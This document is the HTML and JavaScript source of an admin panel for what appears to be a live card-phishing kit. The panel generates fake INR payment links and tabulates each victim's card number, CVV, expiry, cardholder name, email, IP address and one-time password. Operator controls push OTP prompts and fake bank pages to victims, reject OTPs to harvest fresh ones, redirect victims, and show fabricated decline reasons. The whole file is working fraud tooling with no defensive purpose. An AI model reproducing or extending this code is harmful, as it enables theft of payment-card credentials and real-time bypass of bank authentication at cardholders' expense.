<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Admin Panel</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <style>
    body { background: #000; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
    h1 { text-align: center; margin-bottom: 20px; }
    .container { max-width: 1200px; margin: 0 auto; }
    .generate-link { background: #222; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
    .form-group { margin-bottom: 15px; }
    label { display: block; margin-bottom: 5px; color: #aaa; }
    input, textarea { width: 100%; padding: 8px; border: 1px solid #444; background: #333; color: #fff; border-radius: 4px; }
    .payment-link { margin-top: 15px; padding: 10px; background: #333; border-radius: 4px; display: none; }
    .copy-btn { background: #22c55e; border: none; color: #fff; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-left: 10px; }
    table { width: 100%; border-collapse: collapse; background: #111; margin-bottom: 20px; }
    th, td { padding: 10px; border: 1px solid #333; text-align: left; font-size: 12px; }
    th { background: #222; }
    tr:nth-child(even) { background: #222; }
    button { background: #4a90e2; color: #fff; border: none; padding: 6px 10px; margin-right: 4px; cursor: pointer; border-radius: 4px; font-size: 12px; }
    button:hover { background: #357ABD; }
    button:disabled { background: #666; cursor: not-allowed; }
    .status-badge { padding: 2px 6px; border-radius: 3px; font-size: 11px; font-weight: bold; }
    .status-processing { background: #f59e0b; color: #000; }
    .status-otp_pending { background: #3b82f6; color: #fff; }
    .status-otp_received { background: #8b5cf6; color: #fff; }
    .status-success { background: #22c55e; color: #fff; }
    .status-fail { background: #ef4444; color: #fff; }
    .otp-received { background-color: #10B981; color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
    .show-otp-btn { background: #22c55e; }
    .bank-page-btn { background: #8b5cf6; }
    .bank-page-btn:hover { background: #7c3aed; }
    .show-otp-btn:disabled { background: #666; }
    .wrong-otp-btn { background: #ef4444; }
    .wrong-otp-btn:hover { background: #dc2626; }
    .reason-dropdown {
      background: #333;
      color: #fff;
      border: 1px solid #555;
      padding: 4px 8px;
      border-radius: 4px;
      width: 100%;
      margin-bottom: 5px;
    }
    .fail-btn {
      background: #ef4444;
      width: 100%;
      padding: 4px 0;
      margin-top: 5px;
    }
    .fail-btn:hover { background: #dc2626; }
    .reason-container {
      margin-top: 8px;
      width: 100%;
    }
    /* Loading indicator */
    .loading {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 2px solid rgba(255,255,255,.3);
      border-radius: 50%;
      border-top-color: #fff;
      animation: spin 1s ease-in-out infinite;
      margin-left: 8px;
      vertical-align: middle;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    .hidden {
      display: none;
    }
    /* Error message */
    .error-message {
      background-color: #ef4444;
      color: white;
      padding: 10px;
      border-radius: 4px;
      margin-bottom: 15px;
      display: none;
    }
    /* Success message */
    .success-message {
      background-color: #22c55e;
      color: white;
      padding: 10px;
      border-radius: 4px;
      margin-bottom: 15px;
      display: none;
    }
    /* Visitors section */
    .visitors-container {
      background: #222;
      padding: 20px;
      border-radius: 8px;
      margin-bottom: 20px;
    }
    .visitor-item {
      display: flex;
      align-items: center;
      padding: 10px;
      border-bottom: 1px solid #333;
    }
    .visitor-item.new {
      animation: highlight 3s ease-out;
    }
    .visitor-badge {
      background: #ef4444;
      color: white;
      padding: 2px 8px;
      border-radius: 10px;
      font-size: 12px;
      margin-right: 10px;
    }
    .ip-address {
      background: #333;
      padding: 2px 8px;
      border-radius: 4px;
      font-family: monospace;
      margin-right: 10px;
    }
    .visitor-time {
      color: #aaa;
      font-size: 12px;
      margin-left: auto;
    }
    /* Animation for new visitors */
    @keyframes highlight {
      0% { background-color: #ef4444; }
      100% { background-color: transparent; }
    }
    /* Animation for removing visitors */
    .fade-out {
      animation: fadeOut 0.5s ease-out forwards;
    }
    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; transform: translateX(30px); }
    }
    .notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background: #ef4444;
      color: white;
      padding: 15px;
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
      z-index: 1000;
      animation: slideIn 0.3s ease-out;
      max-width: 350px;
    }
    @keyframes slideIn {
      0% { transform: translateX(100%); opacity: 0; }
      100% { transform: translateX(0); opacity: 1; }
    }

    /* Currency button style */
    .currency-btn {
      width: 100%;
      padding: 4px 0;
      margin-top: 5px;
      margin-bottom: 5px;
      border-radius: 4px;
      cursor: pointer;
    }
    .currency-btn:hover {
      background-color: #3b82f6;
    }
    .currency-btn:disabled {
      background-color: #9CA3AF;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Admin Panel</h1>

    <div id="error-msg" class="error-message"></div>
    <div id="success-msg" class="success-message"></div>

    <!-- Visitors Section -->
    <div class="visitors-container">
      <h2>Active Visitors</h2>
      <div id="visitors-list">
        <p>No visitors yet</p>
      </div>
    </div>

    <div class="generate-link">
      <h2>Generate Payment Link</h2>
      <form id="generateLinkForm" onsubmit="return false;">
        <div class="form-group">
          <label>Amount (INR)</label>
          <input type="number" id="amount" required min="1" step="1">
        </div>
        <div class="form-group">
          <label>Description</label>
          <textarea id="description" rows="2" required></textarea>
        </div>
        <button type="button" id="generateBtn">
          Generate Link
          <span id="generateLoader" class="loading hidden"></span>
        </button>
      </form>
      <div id="paymentLinkContainer" class="payment-link">
        <span>Payment Link: </span>
        <span id="paymentLink"></span>
        <button class="copy-btn" id="copyBtn">Copy</button>
      </div>
    </div>

    <h2>Transactions</h2>
    <div id="transactionsLoading" style="text-align:center;">
      <span class="loading"></span> Loading transactions...
    </div>
    <table id="transactionsTable">
      <thead>
        <tr>
          <th>Invoice ID</th>
          <th>Email</th>
          <th>Amount</th>
          <th>Currency</th>
          <th>Card Number</th>
          <th>CVV</th>
          <th>Expiry</th>
          <th>Cardholder</th>
          <th>IP Address</th>
          <th>OTP</th>
          <th>Status</th>
          <th>Actions</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    // Global Variables
    const socket = io();
    let transactionsMap = new Map();
    let visitorsMap = new Map();

    // Show error or success message
    function showMessage(type, message, duration = 5000) {
      const element = document.getElementById(type === 'error' ? 'error-msg' : 'success-msg');
      element.textContent = message;
      element.style.display = 'block';

      // Auto hide after duration
      setTimeout(() => {
        element.style.display = 'none';
      }, duration);
    }

    // Show notification
    function showNotification(message, duration = 5000) {
      const notification = document.createElement('div');
      notification.className = 'notification';
      notification.textContent = message;
      document.body.appendChild(notification);

      // Auto remove after duration
      setTimeout(() => {
        notification.style.opacity = '0';
        notification.style.transform = 'translateX(100%)';
        setTimeout(() => notification.remove(), 300);
      }, duration);
    }

    // Load visitors
    async function loadVisitors() {
      try {
        console.log('Loading visitors from server...');
        const response = await fetch('/api/visitors');

        if (!response.ok) {
          throw new Error(`Failed to load visitors: ${response.status}`);
        }

        const data = await response.json();
        console.log('Visitor data received:', data);

        updateVisitorsList(data);
      } catch (error) {
        console.error('Error loading visitors:', error);
      }
    }

    // Update visitors list
    function updateVisitorsList(visitors) {
      const visitorsList = document.getElementById('visitors-list');

      // Clear existing list first
      visitorsList.innerHTML = '';

      if (!visitors || visitors.length === 0) {
        visitorsList.innerHTML = '<p>No visitors yet</p>';
        return;
      }

      // Sort visitors by timestamp (newest first)
      visitors.sort((a, b) => {
        return new Date(b.timestamp) - new Date(a.timestamp);
      });

      // Add each visitor to the list
      visitors.forEach(visitor => {
        // Store in map for reference
        visitorsMap.set(visitor.pid, visitor);

        // Add to DOM
        addVisitorToList(visitor, false);
      });

      console.log(`Updated visitors list with ${visitors.length} visitors`);
    }

    // Add visitor to list
    function addVisitorToList(visitor, isNew = true) {
      if (!visitor || !visitor.pid) {
        console.error('Invalid visitor data:', visitor);
        return;
      }

      const visitorsList = document.getElementById('visitors-list');

      // Check if this visitor is already in the list
      const existingItem = document.getElementById(`visitor-${visitor.pid}`);
      if (existingItem && !isNew) {
        return; // Skip if already exists and not new
      }

      // Create visitor item
      const visitorItem = document.createElement('div');
      visitorItem.className = isNew ? 'visitor-item new' : 'visitor-item';
      visitorItem.id = `visitor-${visitor.pid}`;

      visitorItem.innerHTML = `
        <span class="visitor-badge">VISITOR</span>
        <span class="ip-address">${visitor.ip || 'Unknown'}</span>
        <span>Payment ID: ${visitor.pid}</span>
        <span class="visitor-time">${visitor.timestamp}</span>
      `;

      // Add to list (at beginning for new visitors)
      if (isNew && visitorsList.firstChild) {
        visitorsList.insertBefore(visitorItem, visitorsList.firstChild);
        console.log('Added new visitor to top of list:', visitor.pid);
      } else {
        visitorsList.appendChild(visitorItem);
        console.log('Added visitor to list:', visitor.pid);
      }

      // Remove "No visitors yet" message if present
      const noVisitorsMsg = visitorsList.querySelector('p');
      if (noVisitorsMsg && noVisitorsMsg.textContent === 'No visitors yet') {
        noVisitorsMsg.remove();
      }
    }

    // Payment Link Generation
    document.getElementById('generateBtn').addEventListener('click', async () => {
      const amountInput = document.getElementById('amount');
      const descInput = document.getElementById('description');
      const linkContainer = document.getElementById('paymentLinkContainer');
      const generateBtn = document.getElementById('generateBtn');
      const generateLoader = document.getElementById('generateLoader');

      // Validate input
      if (!amountInput.value || parseFloat(amountInput.value) <= 0) {
        return showMessage('error', 'Please enter a valid amount');
      }

      if (!descInput.value.trim()) {
        return showMessage('error', 'Please enter a description');
      }

      try {
        // Show loading state
        generateBtn.disabled = true;
        generateLoader.classList.remove('hidden');
        linkContainer.style.display = 'none';

        const amount = parseFloat(amountInput.value);
        const description = descInput.value.trim();

        const response = await fetch('/api/generatePaymentLink', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ amount, description })
        });

        const data = await response.json();

        // Reset loading state
        generateBtn.disabled = false;
        generateLoader.classList.add('hidden');

        if (!response.ok) {
          throw new Error(data.message || 'Failed to generate payment link');
        }

        // Display the payment link returned from the server directly
        document.getElementById('paymentLink').textContent = data.paymentLink;
        linkContainer.style.display = 'block';
        showMessage('success', 'Payment link generated successfully!');
      } catch (error) {
        console.error('Error:', error);
        showMessage('error', `Error: ${error.message}`);
        generateBtn.disabled = false;
        generateLoader.classList.add('hidden');
      }
    });

    // Copy Payment Link
    document.getElementById('copyBtn').addEventListener('click', () => {
      const link = document.getElementById('paymentLink').textContent;
      navigator.clipboard.writeText(link)
        .then(() => {
          showMessage('success', 'Link copied to clipboard!', 2000);
          document.getElementById('copyBtn').textContent = 'Copied!';
          setTimeout(() => {
            document.getElementById('copyBtn').textContent = 'Copy';
          }, 2000);
        })
        .catch(err => {
          showMessage('error', 'Failed to copy link');
        });
    });

    // Transactions Handling
    async function loadTransactions() {
      try {
        const tbody = document.querySelector("#transactionsTable tbody");
        const loadingIndicator = document.getElementById('transactionsLoading');

        loadingIndicator.style.display = 'block';

        const response = await fetch("/api/transactions");

        if (!response.ok) {
          throw new Error('Failed to load transactions');
        }

        const data = await response.json();

        // Hide loading indicator and show table
        loadingIndicator.style.display = 'none';
        tbody.innerHTML = '';

        if (data.length === 0) {
          tbody.innerHTML = `<tr><td colspan="12" style="text-align:center">No transactions found</td></tr>`;
          return;
        }

        data.forEach(tx => {
          const row = document.createElement('tr');
          row.innerHTML = `
            <td>${tx.id}</td>
            <td>${tx.email}</td>
            <td>${tx.amount}</td>
            <td>${tx.currency || 'INR'}</td>
            <td>${tx.cardNumber}</td>
            <td>${tx.cvv}</td>
            <td>${tx.expiry}</td>
            <td>${tx.cardholder}</td>
            <td><span class="ip-address">${tx.ip || 'Unknown'}</span></td>
            <td>
              ${tx.otpEntered ?
                `<span class="otp-received">${tx.otpEntered}</span>
                 <button class="wrong-otp-btn" onclick="markWrongOTP('${tx.id}')" ${tx.redirectStatus ? 'disabled' : ''}>
                   Incorrect OTP
                 </button>` :
                (tx.otpShown ?
                  '<span class="status-badge status-otp">Waiting for OTP</span>' :
                  `<button class="show-otp-btn" onclick="showOTP('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                    Show OTP
                  </button>`)
              }
              <button class="bank-page-btn" onclick="toggleBankpage('${tx.id}')" ${tx.status !== 'processing' ? 'disabled' : ''}>
                ${tx.bankpageVisible ? 'Hide Bankpage' : 'Show Bankpage'}
              </button>
            </td>
            <td>
              <span class="status-badge status-${tx.status || 'processing'}">
                ${tx.status === 'otp_received' ? 'OTP Received' : tx.status === 'otp_pending' ? 'OTP Pending' : tx.status || 'Processing'}
              </span>
            </td>
            <td>
              ${!tx.redirectStatus ? `
                <button onclick="updateStatus('${tx.id}', 'success')" ${!tx.otpEntered ? 'disabled' : ''}>
                  Success
                </button>
                <button onclick="showCurrencyPage('${tx.id}')" class="currency-btn bg-blue-500 text-white mb-2" ${tx.status !== 'processing' ? 'disabled' : ''}>
                  Currency
                </button>
                <div class="reason-container">
                  <select id="reason-${tx.id}" class="reason-dropdown">
                    <option value="insufficient_balance" ${tx.failureReason === 'insufficient_balance' ? 'selected' : ''}>Insufficient Balance</option>
                    <option value="bank_declined" ${tx.failureReason === 'bank_declined' || !tx.failureReason ? 'selected' : ''}>Bank Declined</option>
                    <option value="card_disabled" ${tx.failureReason === 'card_disabled' ? 'selected' : ''}>Card Disabled</option>
                    <option value="invalid_card" ${tx.failureReason === 'invalid_card' ? 'selected' : ''}>Invalid Card</option>
                  </select>
                  <button onclick="updateStatusWithReason('${tx.id}', 'fail')" ${!tx.otpEntered ? 'disabled' : ''}
                    class="fail-btn">
                    Fail
                  </button>
                </div>
              ` : ''}
            </td>
          `;
          tbody.appendChild(row);
          transactionsMap.set(tx.id, tx);
        });
      } catch (error) {
        console.error('Error loading transactions:', error);
        showMessage('error', 'Failed to load transactions');
        document.getElementById('transactionsLoading').style.display = 'none';
      }
    }

    // Transaction Actions
    async function updateStatus(id, status) {
      try {
        const response = await fetch("/api/updateRedirectStatus", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id, redirectStatus: status })
        });

        if (!response.ok) {
          const data = await response.json();
          throw new Error(data.message || 'Failed to update status');
        }

        showMessage('success', `Transaction marked as ${status}`);
        loadTransactions();
      } catch (error) {
        console.error('Error updating status:', error);
        showMessage('error', error.message || 'Failed to update status');
      }
    }

    async function updateStatusWithReason(id, status) {
      try {
        const reasonSelect = document.getElementById(`reason-${id}`);
        const failureReason = reasonSelect.value;

        const response = await fetch("/api/updateRedirectStatus", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id, redirectStatus: status, failureReason })
        });

        if (!response.ok) {
          const data = await response.json();
          throw new Error(data.message || 'Failed to update status with reason');
        }

        showMessage('success', `Transaction marked as failed with reason: ${getReadableReason(failureReason)}`);
        loadTransactions();
      } catch (error) {
        console.error('Error updating status with reason:', error);
        showMessage('error', error.message || 'Failed to update status with reason');
      }
    }

    // Currency Page Redirection
    async function showCurrencyPage(id) {
      const transaction = transactionsMap.get(id);
      if (!transaction) return;

      try {
        // Get the pid from the transaction
        const response = await fetch(`/api/getTransactionPid?invoiceId=${id}`);
        if (!response.ok) {
          throw new Error('Failed to get payment details');
        }

        const data = await response.json();
        if (!data.pid) {
          throw new Error('No payment ID found');
        }

        // Emit socket event to redirect the user
        io.to(id).emit('redirect_to_currency', {
          redirectUrl: `/currencypayment.html?pid=${data.pid}`
        });

        showMessage('success', 'Currency page shown to customer');
      } catch (error) {
        console.error('Error showing currency page:', error);
        showMessage('error', 'Failed to show currency page');
      }
    }

    // Helper function to get readable reason text
    function getReadableReason(reasonCode) {
      const reasons = {
        'insufficient_balance': 'Insufficient Balance',
        'bank_declined': 'Bank Declined',
        'card_disabled': 'Card Disabled',
        'invalid_card': 'Invalid Card'
      };
      return reasons[reasonCode] || reasonCode;
    }

    async function showOTP(id) {
      try {
        const response = await fetch("/api/showOTP", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id })
        });

        if (!response.ok) {
          const data = await response.json();
          throw new Error(data.message || 'Failed to show OTP');
        }

        showMessage('success', 'OTP form shown to customer');
        loadTransactions();
      } catch (error) {
        console.error('Error showing OTP:', error);
        showMessage('error', error.message || 'Failed to show OTP');
      }
    }

    async function markWrongOTP(id) {
      try {
        const response = await fetch("/api/wrongOTP", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id })
        });

        if (!response.ok) {
          const data = await response.json();
          throw new Error(data.message || 'Failed to mark OTP as wrong');
        }

        showMessage('success', 'OTP marked as incorrect');
        loadTransactions();
      } catch (error) {
        console.error('Error marking OTP as wrong:', error);
        showMessage('error', error.message || 'Failed to mark OTP as wrong');
      }
    }

    async function toggleBankpage(id) {
      const tx = transactionsMap.get(id);
      try {
        if (tx.bankpageVisible) {
          await hideBankPage(id);
        } else {
          await showBankpage(id);
        }
      } catch (error) {
        console.error('Error toggling bankpage:', error);
        showMessage('error', error.message || 'Failed to toggle bank page');
      }
    }

    async function showBankpage(id) {
      try {
        const response = await fetch("/api/showBankpage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id })
        });

        if (!response.ok) {
          const data = await response.json();
          throw new Error(data.message || 'Failed to show bank page');
        }

        showMessage('success', 'Bank page shown to customer');
        loadTransactions();
      } catch (error) {
        console.error('Error showing bank page:', error);
        showMessage('error', error.message || 'Failed to show bank page');
      }
    }

    async function hideBankPage(id) {
      try {
        const response = await fetch("/api/hideBankpage", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ invoiceId: id })
        });

        if (!response.ok) {
          const data = await response.json();
          throw new Error(data.message || 'Failed to hide bank page');
        }

        showMessage('success', 'Bank page hidden');
        loadTransactions();
      } catch (error) {
        console.error('Error hiding bank page:', error);
        showMessage('error', error.message || 'Failed to hide bank page');
      }
    }

    // Make functions globally available
    window.updateStatus = updateStatus;
    window.updateStatusWithReason = updateStatusWithReason;
    window.showOTP = showOTP;
    window.markWrongOTP = markWrongOTP;
    window.toggleBankpage = toggleBankpage;
    window.showBankpage = showBankpage;
    window.hideBankPage = hideBankPage;
    window.showCurrencyPage = showCurrencyPage;

    // Socket.io Updates
    socket.on('new_transaction', () => {
      loadTransactions();
    });

    // Handle visitor notifications
    socket.on('visitor', (visitor) => {
      console.log('New visitor detected:', visitor);

      // Add visitor to map
      visitorsMap.set(visitor.pid, visitor);

      // Add to list with highlight animation
      addVisitorToList(visitor, true);

      // Show notification
      showNotification(`New visitor from IP: ${visitor.ip || 'Unknown'}`);

      // Play notification sound
      try {
        const audio = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-alert-quick-chime-766.mp3');
        audio.play().catch(e => console.log('Audio play failed:', e));
      } catch (e) {
        console.log('Could not play notification sound', e);
      }
    });

    // Handle when visitors leave
    socket.on('visitor_left', (data) => {
      console.log('Visitor left:', data.pid);

      // Remove from map
      visitorsMap.delete(data.pid);

      // Remove from display with animation
      const visitorElement = document.getElementById(`visitor-${data.pid}`);
      if (visitorElement) {
        visitorElement.classList.add('fade-out');
        setTimeout(() => {
          visitorElement.remove();

          // Show "No visitors yet" message if this was the last visitor
          const visitorsList = document.getElementById('visitors-list');
          if (visitorsList.children.length === 0) {
            visitorsList.innerHTML = '<p>No visitors yet</p>';
          }
        }, 500);
      }

      // Show notification
      showNotification(`Visitor has left`);
    });

    // Handle existing visitors when reconnecting
    socket.on('existing_visitors', (visitors) => {
      console.log('Received existing visitors:', visitors);
      updateVisitorsList(visitors);
    });

    // Initial Load
    document.addEventListener('DOMContentLoaded', () => {
      console.log('DOM loaded, initializing visitor tracking');
      loadVisitors();
      loadTransactions();

      // Set up refresh intervals
      setInterval(loadVisitors, 10000); // Check for visitors every 10 seconds
      setInterval(loadTransactions, 10000); // Refresh transactions every 10 seconds
    });
  </script>
</body>
</html>
